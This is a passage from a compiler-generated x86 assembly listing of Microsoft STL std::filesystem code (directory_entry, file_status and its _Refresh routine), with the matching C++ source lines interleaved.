  0002e	0f b6 c0	 movzx	 eax, al
  00031	85 c0		 test	 eax, eax
  00033	74 17		 je	 SHORT $LN2@Get_any_st

; 2386 :                 _Result._Error = __std_win_error::_Success;

  00035	c7 45 d0 00 00
	00 00		 mov	 DWORD PTR __Result$[ebp+8], 0

; 2387 :                 _Result._Status._Refresh(__std_win_error::_Success, _Cached_data);

  0003c	8b 4d d8	 mov	 ecx, DWORD PTR _this$[ebp]
  0003f	51		 push	 ecx
  00040	6a 00		 push	 0
  00042	8d 4d c8	 lea	 ecx, DWORD PTR __Result$[ebp]
  00045	e8 00 00 00 00	 call	 ?_Refresh@file_status@filesystem@std@@QAEXW4__std_win_error@@ABU__std_fs_stats@@@Z ; std::filesystem::file_status::_Refresh

; 2388 :             } else {

  0004a	eb 47		 jmp	 SHORT $LN3@Get_any_st
$LN2@Get_any_st:

; 2389 :                 const auto _Error =

  0004c	8b 4d d8	 mov	 ecx, DWORD PTR _this$[ebp]
  0004f	e8 00 00 00 00	 call	 ?_Symlink_hint_attributes@__std_fs_stats@@QBE?AW4__std_fs_file_attr@@XZ ; __std_fs_stats::_Symlink_hint_attributes
  00054	89 45 c4	 mov	 DWORD PTR tv90[ebp], eax
  00057	8b 4d d8	 mov	 ecx, DWORD PTR _this$[ebp]
  0005a	83 c1 20	 add	 ecx, 32			; 00000020H
  0005d	e8 00 00 00 00	 call	 ?c_str@path@filesystem@std@@QBEPB_WXZ ; std::filesystem::path::c_str
  00062	89 45 c0	 mov	 DWORD PTR tv88[ebp], eax
  00065	8b 55 c4	 mov	 edx, DWORD PTR tv90[ebp]
  00068	52		 push	 edx
  00069	8b 45 0c	 mov	 eax, DWORD PTR __Flags$[ebp]
  0006c	50		 push	 eax
  0006d	8d 4d dc	 lea	 ecx, DWORD PTR __Stats$[ebp]
  00070	51		 push	 ecx
  00071	8b 55 c0	 mov	 edx, DWORD PTR tv88[ebp]
  00074	52		 push	 edx
  00075	e8 00 00 00 00	 call	 ___std_fs_get_stats@16
  0007a	89 45 d4	 mov	 DWORD PTR __Error$1[ebp], eax

; 2390 :                     __std_fs_get_stats(_Path.c_str(), &_Stats, _Flags, _Cached_data._Symlink_hint_attributes());
; 2391 :                 _Result._Error = _Error;

  0007d	8b 45 d4	 mov	 eax, DWORD PTR __Error$1[ebp]
  00080	89 45 d0	 mov	 DWORD PTR __Result$[ebp+8], eax

; 2392 :                 _Result._Status._Refresh(_Error, _Stats);

  00083	8d 4d dc	 lea	 ecx, DWORD PTR __Stats$[ebp]
  00086	51		 push	 ecx
  00087	8b 55 d4	 mov	 edx, DWORD PTR __Error$1[ebp]
  0008a	52		 push	 edx
  0008b	8d 4d c8	 lea	 ecx, DWORD PTR __Result$[ebp]
  0008e	e8 00 00 00 00	 call	 ?_Refresh@file_status@filesystem@std@@QAEXW4__std_win_error@@ABU__std_fs_stats@@@Z ; std::filesystem::file_status::_Refresh
$LN3@Get_any_st:

; 2393 :             }
; 2394 : 
; 2395 :             return _Result;

  00093	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]
  00096	8b 4d c8	 mov	 ecx, DWORD PTR __Result$[ebp]
  00099	89 08		 mov	 DWORD PTR [eax], ecx
  0009b	8b 55 cc	 mov	 edx, DWORD PTR __Result$[ebp+4]
  0009e	89 50 04	 mov	 DWORD PTR [eax+4], edx
  000a1	8b 4d d0	 mov	 ecx, DWORD PTR __Result$[ebp+8]
  000a4	89 48 08	 mov	 DWORD PTR [eax+8], ecx
  000a7	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 2396 :         }

  000aa	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  000ad	33 cd		 xor	 ecx, ebp
  000af	e8 00 00 00 00	 call	 @__security_check_cookie@4
  000b4	8b e5		 mov	 esp, ebp
  000b6	5d		 pop	 ebp
  000b7	c2 08 00	 ret	 8
?_Get_any_status@directory_entry@filesystem@std@@ABE?AU_File_status_and_error@23@W4__std_fs_stats_flags@@@Z ENDP ; std::filesystem::directory_entry::_Get_any_status
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?is_regular_file@directory_entry@filesystem@std@@QBE_NXZ
_TEXT	SEGMENT
$T1 = -12						; size = 8
_this$ = -4						; size = 4
?is_regular_file@directory_entry@filesystem@std@@QBE_NXZ PROC ; std::filesystem::directory_entry::is_regular_file, COMDAT
; _this$ = ecx

; 2234 :         _NODISCARD bool is_regular_file() const {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2235 :             return _STD filesystem::is_regular_file(this->status());

  00009	8d 45 f4	 lea	 eax, DWORD PTR $T1[ebp]
  0000c	50		 push	 eax
  0000d	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00010	e8 00 00 00 00	 call	 ?status@directory_entry@filesystem@std@@QBE?AVfile_status@23@XZ ; std::filesystem::directory_entry::status
  00015	8b 48 04	 mov	 ecx, DWORD PTR [eax+4]
  00018	51		 push	 ecx
  00019	8b 10		 mov	 edx, DWORD PTR [eax]
  0001b	52		 push	 edx
  0001c	e8 00 00 00 00	 call	 ?is_regular_file@filesystem@std@@YA_NVfile_status@12@@Z ; std::filesystem::is_regular_file
  00021	83 c4 08	 add	 esp, 8

; 2236 :         }

  00024	8b e5		 mov	 esp, ebp
  00026	5d		 pop	 ebp
  00027	c3		 ret	 0
?is_regular_file@directory_entry@filesystem@std@@QBE_NXZ ENDP ; std::filesystem::directory_entry::is_regular_file
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?path@directory_entry@filesystem@std@@QBEABV023@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?path@directory_entry@filesystem@std@@QBEABV023@XZ PROC	; std::filesystem::directory_entry::path, COMDAT
; _this$ = ecx

; 2173 :         _NODISCARD const filesystem::path& path() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2174 :             return _Path;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	83 c0 20	 add	 eax, 32			; 00000020H

; 2175 :         }

  0000d	8b e5		 mov	 esp, ebp
  0000f	5d		 pop	 ebp
  00010	c3		 ret	 0
?path@directory_entry@filesystem@std@@QBEABV023@XZ ENDP	; std::filesystem::directory_entry::path
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??1directory_entry@filesystem@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1directory_entry@filesystem@std@@QAE@XZ PROC		; std::filesystem::directory_entry::~directory_entry, COMDAT
; _this$ = ecx

; 2122 :         ~directory_entry() = default;

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	83 c1 20	 add	 ecx, 32			; 00000020H
  0000d	e8 00 00 00 00	 call	 ??1path@filesystem@std@@QAE@XZ ; std::filesystem::path::~path
  00012	8b e5		 mov	 esp, ebp
  00014	5d		 pop	 ebp
  00015	c3		 ret	 0
??1directory_entry@filesystem@std@@QAE@XZ ENDP		; std::filesystem::directory_entry::~directory_entry
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??0directory_entry@filesystem@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??0directory_entry@filesystem@std@@QAE@XZ PROC		; std::filesystem::directory_entry::directory_entry, COMDAT
; _this$ = ecx

; 2107 :         directory_entry() noexcept : _Cached_data{}, _Path() {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	33 c0		 xor	 eax, eax
  00009	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000c	89 01		 mov	 DWORD PTR [ecx], eax
  0000e	89 41 04	 mov	 DWORD PTR [ecx+4], eax
  00011	89 41 08	 mov	 DWORD PTR [ecx+8], eax
  00014	89 41 0c	 mov	 DWORD PTR [ecx+12], eax
  00017	89 41 10	 mov	 DWORD PTR [ecx+16], eax
  0001a	89 41 14	 mov	 DWORD PTR [ecx+20], eax
  0001d	89 41 18	 mov	 DWORD PTR [ecx+24], eax
  00020	89 41 1c	 mov	 DWORD PTR [ecx+28], eax
  00023	33 d2		 xor	 edx, edx
  00025	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00028	83 c0 20	 add	 eax, 32			; 00000020H
  0002b	89 10		 mov	 DWORD PTR [eax], edx
  0002d	89 50 04	 mov	 DWORD PTR [eax+4], edx
  00030	89 50 08	 mov	 DWORD PTR [eax+8], edx
  00033	89 50 0c	 mov	 DWORD PTR [eax+12], edx
  00036	89 50 10	 mov	 DWORD PTR [eax+16], edx
  00039	89 50 14	 mov	 DWORD PTR [eax+20], edx
  0003c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0003f	83 c1 20	 add	 ecx, 32			; 00000020H
  00042	e8 00 00 00 00	 call	 ??0path@filesystem@std@@QAE@XZ ; std::filesystem::path::path
  00047	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0004a	8b e5		 mov	 esp, ebp
  0004c	5d		 pop	 ebp
  0004d	c3		 ret	 0
??0directory_entry@filesystem@std@@QAE@XZ ENDP		; std::filesystem::directory_entry::directory_entry
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??0_File_status_and_error@filesystem@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??0_File_status_and_error@filesystem@std@@QAE@XZ PROC	; std::filesystem::_File_status_and_error::_File_status_and_error, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??0file_status@filesystem@std@@QAE@XZ ; std::filesystem::file_status::file_status
  0000f	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00012	8b e5		 mov	 esp, ebp
  00014	5d		 pop	 ebp
  00015	c3		 ret	 0
??0_File_status_and_error@filesystem@std@@QAE@XZ ENDP	; std::filesystem::_File_status_and_error::_File_status_and_error
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?_Not_good@_File_status_and_error@filesystem@std@@QBE_NXZ
_TEXT	SEGMENT
tv74 = -8						; size = 4
_this$ = -4						; size = 4
?_Not_good@_File_status_and_error@filesystem@std@@QBE_NXZ PROC ; std::filesystem::_File_status_and_error::_Not_good, COMDAT
; _this$ = ecx

; 2081 :         _NODISCARD bool _Not_good() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2082 :             // [fs.op.status]/Throws: result values of file_status(file_type::not_found) and
; 2083 :             // file_status(file_type::unknown) are not considered failures and do not cause an exception to be thrown.
; 2084 :             return _Error != __std_win_error::_Success && _Status.type() != file_type::not_found

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	83 78 08 00	 cmp	 DWORD PTR [eax+8], 0
  00010	74 23		 je	 SHORT $LN3@Not_good
  00012	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00015	e8 00 00 00 00	 call	 ?type@file_status@filesystem@std@@QBE?AW4file_type@23@XZ ; std::filesystem::file_status::type
  0001a	83 f8 01	 cmp	 eax, 1
  0001d	74 16		 je	 SHORT $LN3@Not_good
  0001f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00022	e8 00 00 00 00	 call	 ?type@file_status@filesystem@std@@QBE?AW4file_type@23@XZ ; std::filesystem::file_status::type
  00027	83 f8 09	 cmp	 eax, 9
  0002a	74 09		 je	 SHORT $LN3@Not_good
  0002c	c7 45 f8 01 00
	00 00		 mov	 DWORD PTR tv74[ebp], 1
  00033	eb 07		 jmp	 SHORT $LN4@Not_good
$LN3@Not_good:
  00035	c7 45 f8 00 00
	00 00		 mov	 DWORD PTR tv74[ebp], 0
$LN4@Not_good:
  0003c	0f b6 45 f8	 movzx	 eax, BYTE PTR tv74[ebp]

; 2085 :                 && _Status.type() != file_type::unknown;
; 2086 :         }

  00040	8b e5		 mov	 esp, ebp
  00042	5d		 pop	 ebp
  00043	c3		 ret	 0
?_Not_good@_File_status_and_error@filesystem@std@@QBE_NXZ ENDP ; std::filesystem::_File_status_and_error::_Not_good
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?is_regular_file@filesystem@std@@YA_NVfile_status@12@@Z
_TEXT	SEGMENT
tv67 = -4						; size = 4
__Status$ = 8						; size = 8
?is_regular_file@filesystem@std@@YA_NVfile_status@12@@Z PROC ; std::filesystem::is_regular_file, COMDAT

; 2062 :     _EXPORT_STD _NODISCARD inline bool is_regular_file(const file_status _Status) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 2063 :         // tests whether _Status indicates a regular file
; 2064 :         return _Status.type() == file_type::regular;

  00004	8d 4d 08	 lea	 ecx, DWORD PTR __Status$[ebp]
  00007	e8 00 00 00 00	 call	 ?type@file_status@filesystem@std@@QBE?AW4file_type@23@XZ ; std::filesystem::file_status::type
  0000c	83 f8 02	 cmp	 eax, 2
  0000f	75 09		 jne	 SHORT $LN3@is_regular
  00011	c7 45 fc 01 00
	00 00		 mov	 DWORD PTR tv67[ebp], 1
  00018	eb 07		 jmp	 SHORT $LN4@is_regular
$LN3@is_regular:
  0001a	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR tv67[ebp], 0
$LN4@is_regular:
  00021	0f b6 45 fc	 movzx	 eax, BYTE PTR tv67[ebp]

; 2065 :     }

  00025	8b e5		 mov	 esp, ebp
  00027	5d		 pop	 ebp
  00028	c3		 ret	 0
?is_regular_file@filesystem@std@@YA_NVfile_status@12@@Z ENDP ; std::filesystem::is_regular_file
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$_Bitmask_includes_any@W4__std_fs_file_attr@@@std@@YA_NW4__std_fs_file_attr@@0@Z
_TEXT	SEGMENT
tv68 = -4						; size = 4
__Left$ = 8						; size = 4
__Elements$ = 12					; size = 4
??$_Bitmask_includes_any@W4__std_fs_file_attr@@@std@@YA_NW4__std_fs_file_attr@@0@Z PROC ; std::_Bitmask_includes_any<enum __std_fs_file_attr>, COMDAT

; 2298 : _NODISCARD constexpr bool _Bitmask_includes_any(_Bitmask _Left, _Bitmask _Elements) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 2299 :     return (_Left & _Elements) != _Bitmask{};

  00004	8b 45 0c	 mov	 eax, DWORD PTR __Elements$[ebp]
  00007	50		 push	 eax
  00008	8b 4d 08	 mov	 ecx, DWORD PTR __Left$[ebp]
  0000b	51		 push	 ecx
  0000c	e8 00 00 00 00	 call	 ??I@YA?AW4__std_fs_file_attr@@W40@0@Z ; operator&
  00011	83 c4 08	 add	 esp, 8
  00014	85 c0		 test	 eax, eax
  00016	74 09		 je	 SHORT $LN3@Bitmask_in
  00018	c7 45 fc 01 00
	00 00		 mov	 DWORD PTR tv68[ebp], 1
  0001f	eb 07		 jmp	 SHORT $LN4@Bitmask_in
$LN3@Bitmask_in:
  00021	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR tv68[ebp], 0
$LN4@Bitmask_in:
  00028	0f b6 45 fc	 movzx	 eax, BYTE PTR tv68[ebp]

; 2300 : }

  0002c	8b e5		 mov	 esp, ebp
  0002e	5d		 pop	 ebp
  0002f	c3		 ret	 0
??$_Bitmask_includes_any@W4__std_fs_file_attr@@@std@@YA_NW4__std_fs_file_attr@@0@Z ENDP ; std::_Bitmask_includes_any<enum __std_fs_file_attr>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?_Refresh@file_status@filesystem@std@@QAEXW4__std_win_error@@ABU__std_fs_stats@@@Z
_TEXT	SEGMENT
tv136 = -12						; size = 4
__Attrs$1 = -8						; size = 4
_this$ = -4						; size = 4
__Error$ = 8						; size = 4
__Stats$ = 12						; size = 4
?_Refresh@file_status@filesystem@std@@QAEXW4__std_win_error@@ABU__std_fs_stats@@@Z PROC ; std::filesystem::file_status::_Refresh, COMDAT
; _this$ = ecx

; 1960 :         void _Refresh(const __std_win_error _Error, const __std_fs_stats& _Stats) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1961 :             if (_Error == __std_win_error::_Success) {

  00009	83 7d 08 00	 cmp	 DWORD PTR __Error$[ebp], 0
  0000d	0f 85 b2 00 00
	00		 jne	 $LN2@Refresh

; 1962 :                 const auto _Attrs = _Stats._Attributes;

  00013	8b 45 0c	 mov	 eax, DWORD PTR __Stats$[ebp]
  00016	8b 48 10	 mov	 ecx, DWORD PTR [eax+16]
  00019	89 4d f8	 mov	 DWORD PTR __Attrs$1[ebp], ecx

; 1963 : 
; 1964 :                 if (_Bitmask_includes_any(_Attrs, __std_fs_file_attr::_Readonly)) {

  0001c	6a 01		 push	 1
  0001e	8b 55 f8	 mov	 edx, DWORD PTR __Attrs$1[ebp]
  00021	52		 push	 edx
  00022	e8 00 00 00 00	 call	 ??$_Bitmask_includes_any@W4__std_fs_file_attr@@@std@@YA_NW4__std_fs_file_attr@@0@Z ; std::_Bitmask_includes_any<enum __std_fs_file_attr>
  00027	83 c4 08	 add	 esp, 8
  0002a	0f b6 c0	 movzx	 eax, al
  0002d	85 c0		 test	 eax, eax
  0002f	74 0f		 je	 SHORT $LN3@Refresh

; 1965 :                     this->permissions(perms::_File_attribute_readonly);

  00031	68 6d 01 00 00	 push	 365			; 0000016dH
  00036	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00039	e8 00 00 00 00	 call	 ?permissions@file_status@filesystem@std@@QAEXW4perms@23@@Z ; std::filesystem::file_status::permissions

; 1966 :                 } else {

  0003e	eb 0d		 jmp	 SHORT $LN4@Refresh
$LN3@Refresh:

; 1967 :                     this->permissions(perms::all);

  00040	68 ff 01 00 00	 push	 511			; 000001ffH
  00045	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00048	e8 00 00 00 00	 call	 ?permissions@file_status@filesystem@std@@QAEXW4perms@23@@Z ; std::filesystem::file_status::permissions
$LN4@Refresh:

; 1968 :                 }
; 1969 : 
; 1970 :                 if (_Bitmask_includes_any(_Attrs, __std_fs_file_attr::_Reparse_point)) {

  0004d	68 00 04 00 00	 push	 1024			; 00000400H
  00052	8b 4d f8	 mov	 ecx, DWORD PTR __Attrs$1[ebp]
  00055	51		 push	 ecx
  00056	e8 00 00 00 00	 call	 ??$_Bitmask_includes_any@W4__std_fs_file_attr@@@std@@YA_NW4__std_fs_file_attr@@0@Z ; std::_Bitmask_includes_any<enum __std_fs_file_attr>
  0005b	83 c4 08	 add	 esp, 8
  0005e	0f b6 d0	 movzx	 edx, al
  00061	85 d2		 test	 edx, edx
  00063	74 33		 je	 SHORT $LN7@Refresh

; 1971 :                     if (_Stats._Reparse_point_tag == __std_fs_reparse_tag::_Symlink) {

  00065	8b 45 0c	 mov	 eax, DWORD PTR __Stats$[ebp]
  00068	81 78 14 0c 00
	00 a0		 cmp	 DWORD PTR [eax+20], -1610612724 ; a000000cH
  0006f	75 0f		 jne	 SHORT $LN6@Refresh

; 1972 :                         this->type(file_type::symlink);

  00071	6a 04		 push	 4
  00073	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00076	e8 00 00 00 00	 call	 ?type@file_status@filesystem@std@@QAEXW4file_type@23@@Z ; std::filesystem::file_status::type

; 1973 :                         return;

  0007b	e9 81 00 00 00	 jmp	 $LN1@Refresh
$LN6@Refresh:

; 1974 :                     }
; 1975 : 
; 1976 :                     if (_Stats._Reparse_point_tag == __std_fs_reparse_tag::_Mount_point) {

  00080	8b 4d 0c	 mov	 ecx, DWORD PTR __Stats$[ebp]
  00083	81 79 14 03 00
	00 a0		 cmp	 DWORD PTR [ecx+20], -1610612733 ; a0000003H
  0008a	75 0c		 jne	 SHORT $LN7@Refresh

; 1977 :                         this->type(file_type::junction);

  0008c	6a 0a		 push	 10			; 0000000aH
  0008e	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00091	e8 00 00 00 00	 call	 ?type@file_status@filesystem@std@@QAEXW4file_type@23@@Z ; std::filesystem::file_status::type

; 1978 :                         return;

  00096	eb 69		 jmp	 SHORT $LN1@Refresh
$LN7@Refresh:

; 1979 :                     }
; 1980 : 
; 1981 :                     // All other reparse points considered ordinary files or directories
; 1982 :                 }
; 1983 : 
; 1984 :                 if (_Bitmask_includes_any(_Attrs, __std_fs_file_attr::_Directory)) {

  00098	6a 10		 push	 16			; 00000010H
  0009a	8b 55 f8	 mov	 edx, DWORD PTR __Attrs$1[ebp]
  0009d	52		 push	 edx
  0009e	e8 00 00 00 00	 call	 ??$_Bitmask_includes_any@W4__std_fs_file_attr@@@std@@YA_NW4__std_fs_file_attr@@0@Z ; std::_Bitmask_includes_any<enum __std_fs_file_attr>
  000a3	83 c4 08	 add	 esp, 8
  000a6	0f b6 c0	 movzx	 eax, al
  000a9	85 c0		 test	 eax, eax
  000ab	74 0c		 je	 SHORT $LN8@Refresh

; 1985 :                     this->type(file_type::directory);

  000ad	6a 03		 push	 3
  000af	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  000b2	e8 00 00 00 00	 call	 ?type@file_status@filesystem@std@@QAEXW4file_type@23@@Z ; std::filesystem::file_status::type

; 1986 :                 } else {

  000b7	eb 0a		 jmp	 SHORT $LN9@Refresh
$LN8@Refresh:

; 1987 :                     this->type(file_type::regular);

  000b9	6a 02		 push	 2
  000bb	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  000be	e8 00 00 00 00	 call	 ?type@file_status@filesystem@std@@QAEXW4file_type@23@@Z ; std::filesystem::file_status::type
$LN9@Refresh:

; 1988 :                 }
; 1989 : 
; 1990 :                 return;

  000c3	eb 3c		 jmp	 SHORT $LN1@Refresh
$LN2@Refresh:

; 1991 :             }
; 1992 : 
; 1993 :             this->permissions(perms::unknown);

  000c5	68 ff ff 00 00	 push	 65535			; 0000ffffH
  000ca	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  000cd	e8 00 00 00 00	 call	 ?permissions@file_status@filesystem@std@@QAEXW4perms@23@@Z ; std::filesystem::file_status::permissions

; 1994 :             this->type(__std_is_file_not_found(_Error) ? file_type::not_found : file_type::none);

  000d2	8b 4d 08	 mov	 ecx, DWORD PTR __Error$[ebp]
  000d5	51		 push	 ecx
  000d6	e8 00 00 00 00	 call	 ___std_is_file_not_found
  000db	83 c4 04	 add	 esp, 4
  000de	0f b6 d0	 movzx	 edx, al
  000e1	85 d2		 test	 edx, edx
  000e3	74 09		 je	 SHORT $LN11@Refresh
  000e5	c7 45 f4 01 00
	00 00		 mov	 DWORD PTR tv136[ebp], 1
  000ec	eb 07		 jmp	 SHORT $LN12@Refresh
$LN11@Refresh:
  000ee	c7 45 f4 00 00
	00 00		 mov	 DWORD PTR tv136[ebp], 0
$LN12@Refresh:
  000f5	8b 45 f4	 mov	 eax, DWORD PTR tv136[ebp]
  000f8	50		 push	 eax
  000f9	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  000fc	e8 00 00 00 00	 call	 ?type@file_status@filesystem@std@@QAEXW4file_type@23@@Z ; std::filesystem::file_status::type
$LN1@Refresh:

; 1995 :         }

  00101	8b e5		 mov	 esp, ebp
  00103	5d		 pop	 ebp
  00104	c2 08 00	 ret	 8
?_Refresh@file_status@filesystem@std@@QAEXW4__std_win_error@@ABU__std_fs_stats@@@Z ENDP ; std::filesystem::file_status::_Refresh
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?type@file_status@filesystem@std@@QBE?AW4file_type@23@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?type@file_status@filesystem@std@@QBE?AW4file_type@23@XZ PROC ; std::filesystem::file_status::type, COMDAT
; _this$ = ecx

; 1946 :         _NODISCARD file_type type() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1947 :             return _Myftype;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 00		 mov	 eax, DWORD PTR [eax]

; 1948 :         }

  0000c	8b e5		 mov	 esp, ebp
  0000e	5d		 pop	 ebp
  0000f	c3		 ret	 0
?type@file_status@filesystem@std@@QBE?AW4file_type@23@XZ ENDP ; std::filesystem::file_status::type
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?permissions@file_status@filesystem@std@@QAEXW4perms@23@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Perms$ = 8						; size = 4
?permissions@file_status@filesystem@std@@QAEXW4perms@23@@Z PROC ; std::filesystem::file_status::permissions, COMDAT
; _this$ = ecx

; 1941 :         void permissions(perms _Perms) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1942 :             _Myperms = _Perms;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 4d 08	 mov	 ecx, DWORD PTR __Perms$[ebp]
  0000d	89 48 04	 mov	 DWORD PTR [eax+4], ecx

; 1943 :         }

  00010	8b e5		 mov	 esp, ebp
  00012	5d		 pop	 ebp
  00013	c2 04 00	 ret	 4
?permissions@file_status@filesystem@std@@QAEXW4perms@23@@Z ENDP ; std::filesystem::file_status::permissions
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?type@file_status@filesystem@std@@QAEXW4file_type@23@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Ft$ = 8						; size = 4
?type@file_status@filesystem@std@@QAEXW4file_type@23@@Z PROC ; std::filesystem::file_status::type, COMDAT
; _this$ = ecx

; 1937 :         void type(file_type _Ft) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1938 :             _Myftype = _Ft;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 4d 08	 mov	 ecx, DWORD PTR __Ft$[ebp]
  0000d	89 08		 mov	 DWORD PTR [eax], ecx

; 1939 :         }

  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c2 04 00	 ret	 4
?type@file_status@filesystem@std@@QAEXW4file_type@23@@Z ENDP ; std::filesystem::file_status::type
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??0file_status@filesystem@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??0file_status@filesystem@std@@QAE@XZ PROC		; std::filesystem::file_status::file_status, COMDAT
; _this$ = ecx

; 1926 :         file_status() noexcept = default;

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1927 :         explicit file_status(file_type _Ft, perms _Perms = perms::unknown) noexcept : _Myftype(_Ft), _Myperms(_Perms) {}
; 1928 :         file_status(const file_status&) noexcept = default;
; 1929 :         file_status(file_status&&) noexcept      = default;
; 1930 :         ~file_status() noexcept                  = default;
; 1931 : 
; 1932 :         // assignments
; 1933 :         file_status& operator=(const file_status&) noexcept = default;
; 1934 :         file_status& operator=(file_status&&) noexcept      = default;
; 1935 : 
; 1936 :         // [fs.file_status.mods], modifiers
; 1937 :         void type(file_type _Ft) noexcept {
; 1938 :             _Myftype = _Ft;
; 1939 :         }
; 1940 : 
